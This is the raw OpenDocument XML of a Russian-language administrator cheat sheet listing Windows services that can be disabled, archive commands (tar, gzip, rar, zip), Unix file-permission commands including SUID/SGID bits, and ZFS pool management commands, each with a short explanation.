      <text:p text:style-name="P1"><text:span text:style-name="T1">Вторичный вход в систему - если вы являетесь единственным пользователем в системе и в ней нет других учетных записей, эта служба может быть отключена.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Рабочие папки - предоставляет возможность настройки доступа к данным внутри корпоративной сети. Если вы в таковую не входите, можно отключать.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сетевая служба Xbox Live - если не играете на Xbox и в Windows-версии игр для этой консоли, службу можно отключить.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба датчиков - аналогично предыдущему пункту, может быть отключена.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба завершения работы в качестве гостя - Hyper-V.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба маршрутизатора AllJoyn - протокол передачи данных, который рядовому пользователю скорее всего не потребуется.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Служба наблюдения за датчиками - аналогично службе датчиков и их данных, может быть деактивирована без вреда для ОС.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Служба обмена данными — Hyper-V.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба поддержки Bluetooth - можно отключить лишь в том случае, если вы не используете Bluetooth-совместимые устройства и не планируете этого делать.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба пульса - Hyper-V.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба сеансов виртуальных машин Hyper-V.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба синхронизации времени Hyper-V.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Служба шифрования дисков BitLocker - если вы не используете данную функцию Windows, можете отключать.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Архивация и сжатие файлов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">gzip</text:span><text:span text:style-name="T1"> -9 </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 - Поместить файл </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 в архив </text:span><text:span text:style-name="T3">gzip</text:span><text:span text:style-name="T1"> с максимальной степенью сжатия</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">rar</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1.</text:span><text:span text:style-name="T3">rar</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">2 </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">1 - Создать </text:span><text:span text:style-name="T3">rar</text:span><text:span text:style-name="T1"> архив </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1.</text:span><text:span text:style-name="T3">rar</text:span><text:span text:style-name="T1">, заархивировав файлы: </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1, </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">2 и директорию: </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># rar a file1.rar test_file - Упаковать в rar архив file1.rar файл test_file</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># rar x file.rar - Разархивировать rar архив file.rar</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># bzip2 file1 - Сжимает файл file1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># bunzip2 file1.bz2 - Разжимает файл file1.bz2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># gzip file1 - Сжимает файл file1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># gunzip file1.gz - Разжимает файл file1.gz</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -cvf archive.tar file1 file2 dir1 - </text:span><text:span text:style-name="T1">Создать</text:span><text:span text:style-name="T3"> tar </text:span><text:span text:style-name="T1">архив</text:span><text:span text:style-name="T3"> archive.tar, </text:span><text:span text:style-name="T1">упаковав</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">него</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файлы</text:span><text:span text:style-name="T3"> file1, file2 </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">директорию</text:span><text:span text:style-name="T3"> dir1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -cvf archive.tar file - </text:span><text:span text:style-name="T1">Упаковать</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> tar-</text:span><text:span text:style-name="T1">архив</text:span><text:span text:style-name="T3"> archive.tar, </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> file</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -tf archive.tar - </text:span><text:span text:style-name="T1">Вывести</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">содержимое</text:span><text:span text:style-name="T3"> tar </text:span><text:span text:style-name="T1">архива</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -xvf archive.tar - </text:span><text:span text:style-name="T1">Распаковать</text:span><text:span text:style-name="T3"> tar </text:span><text:span text:style-name="T1">архив</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tar -xvf archive.tar -C /tmp - Распаковать архив в /tmp</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">cvfz</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">archive</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gz</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">1 - Создать </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> архив и сжать его с помощью программы </text:span><text:span text:style-name="T3">gzip</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">xvfz</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">archive</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gz</text:span><text:span text:style-name="T1"> - Разжать </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> архив и распаковать его</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">cvfj</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">archive</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">bz</text:span><text:span text:style-name="T1">2 </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">1 - Создать архив и сжать его с помощью </text:span><text:span text:style-name="T3">bzip</text:span><text:span text:style-name="T1">2 (ключ -</text:span><text:span text:style-name="T3">j</text:span><text:span text:style-name="T1"> работает не во всех *</text:span><text:span text:style-name="T3">nix</text:span><text:span text:style-name="T1"> системах )</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">xvfj</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">archive</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">tar</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">bz</text:span><text:span text:style-name="T1">2 - Разжать архив и распаковать его (ключ -</text:span><text:span text:style-name="T3">j</text:span><text:span text:style-name="T1"> работает не во всех *</text:span><text:span text:style-name="T3">nix</text:span><text:span text:style-name="T1"> системах)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">zip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1.</text:span><text:span text:style-name="T3">zip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 - Создать сжатый </text:span><text:span text:style-name="T3">zip</text:span><text:span text:style-name="T1">-архив</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">zip</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1.</text:span><text:span text:style-name="T3">zip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1 </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">2 </text:span><text:span text:style-name="T3">dir</text:span><text:span text:style-name="T1">1 - Запаковать в архив несколько файлов и/или директорий</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">unzip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1.</text:span><text:span text:style-name="T3">zip</text:span><text:span text:style-name="T1"> - Разжать и распаковать </text:span><text:span text:style-name="T3">zip</text:span><text:span text:style-name="T1">-архив</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">unrar</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">1.</text:span><text:span text:style-name="T3">rar</text:span><text:span text:style-name="T1"> - Распаковать </text:span><text:span text:style-name="T3">rar</text:span><text:span text:style-name="T1">-архив</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Работа с правами доступа файлов и директорий</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Назначить пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> владельцем файла </text:span><text:span text:style-name="T3">file</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">R</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Рекурсивно обойти директорию </text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> и назначить пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> владельцем всех вложенных файлов и директорий</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1">:</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Назначить владельца и группу для файла /</text:span><text:span text:style-name="T3">file</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ugo</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Установить полные права доступа </text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> ( </text:span><text:span text:style-name="T3">Read</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Write</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">eXecute</text:span><text:span text:style-name="T1"> ) для всех </text:span><text:span text:style-name="T3">ugo</text:span><text:span text:style-name="T1"> ( </text:span><text:span text:style-name="T3">User</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Other</text:span><text:span text:style-name="T1"> ) на директорию /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1">. То-же самое можно сделать, используя числовой представление </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> 777 </text:span><text:span text:style-name="T3">directory</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">go</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Удалить все права на директорию /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> для группы и остальных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chgrp</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Изменить группу-владельца для </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> на </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">group</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1"> - Установить так называемый </text:span><text:span text:style-name="T3">STIKY</text:span><text:span text:style-name="T1">-бит на директорию /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1">. Удалить файл в такой директории может только владелец данного файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">o</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1"> - Удалить </text:span><text:span text:style-name="T3">STIKY</text:span><text:span text:style-name="T1">-бит с директории /</text:span><text:span text:style-name="T3">home</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod u+s /bin/binary_file - </text:span><text:span text:style-name="T1">Установить</text:span><text:span text:style-name="T3"> SUID-</text:span><text:span text:style-name="T1">бит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> /bin/binary_file. </text:span><text:span text:style-name="T1">Это позволяет любому пользователю системы, запускать данный файл с правами владельца файла</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod u-s /bin/binary_file - Удалить SUID-бит с файла /bin/binary_file</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod g+s /home/public - </text:span><text:span text:style-name="T1">Установить</text:span><text:span text:style-name="T3"> SGID-</text:span><text:span text:style-name="T1">бит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">директории</text:span><text:span text:style-name="T3"> /home/public</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># chmod g-s /home/public - Удалить SGID-бит с директории /home/public</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">find</text:span><text:span text:style-name="T1"> / -</text:span><text:span text:style-name="T3">perm</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">u</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> - Поиск всех файлов с установленным </text:span><text:span text:style-name="T3">SUID</text:span><text:span text:style-name="T1"> битом, начиная с корня файловой системы</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">lh</text:span><text:span text:style-name="T1"> - Листинг текущего каталога с правами доступа</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шпаргалка по </text:span><text:span text:style-name="T3">ZFS</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">modinfo</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">head</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> 9 - узнать версию </text:span><text:span text:style-name="T3">ZFS</text:span><text:span text:style-name="T1"> и другие подробности</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Информация о пулах / файловых системах (ФС) на пулах</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> - статус пулов</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">status</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">v</text:span><text:span text:style-name="T1"> - статус пулов подробный</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1"> - список ФС, так называются монтируемые разделы в пулах</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">zfs</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">get</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">all</text:span><text:span text:style-name="T1"> - вся инфа по пулам, вообще вся</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Управление пулами / дисками</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">lha</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">dev</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">by</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">id</text:span><text:span text:style-name="T1">/ - выяснить айдишники дисков чтобы потом на них создать пул (будут проблемы если подцепишь по буквенному названию диска типа </text:span><text:span text:style-name="T3">sda</text:span><text:span text:style-name="T1">, они динамически меняются)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">create</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">id</text:span><text:span text:style-name="T1">-1 </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">id</text:span><text:span text:style-name="T1">-2 - может быть сколько угодно дисков, с ключом -</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> форсить создание пула</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">create</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">m</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">mnt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">id</text:span><text:span text:style-name="T1">-1 - создать пул с указанием папки маунтирования</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">destroy</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> - уничтожить пул </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1">, с ключом -</text:span><text:span text:style-name="T3">f</text:span><text:span text:style-name="T1"> форсить уничтожение</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mkfile</text:span><text:span text:style-name="T1"> 100</text:span><text:span text:style-name="T3">m</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">1 </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">2 - создать файлы дисков</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">create</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">1 /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">2- создать пул </text:span><text:span text:style-name="T3">backups</text:span><text:span text:style-name="T1"> на созданных файлах</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">create</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">mirror</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">1 /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">2 - создать пул </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> с зеркалированием на 2 диска</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">add</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3 - добавить диск в пул</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">attach</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3 - добавить устройство в пул, если он в зеркале то станет в зеркало, если простой, то пул расширится</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">remove</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">mirror</text:span><text:span text:style-name="T1">-1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">detach</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3 - исключить устройство из пула</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">remove</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3 - удаление устройства из пула</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">add</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">spare</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3 - добавление диска горячей замены в пул</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">remove</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">spare</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3 - удаление диска горячей замены из пула</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">offline</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">1 - отключить устройство, на него не будет никакой записи и с него чтения, если добавить ключ -</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1">, то после ребута станет онлайн</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool online zfspool /disk1 - включить disk1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">zpool</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">replace</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">zfspool</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">1 /</text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3 - заменить </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1"> 1, например в случае неисправности на </text:span><text:span text:style-name="T3">disk</text:span><text:span text:style-name="T1">3</text:span></text:p>
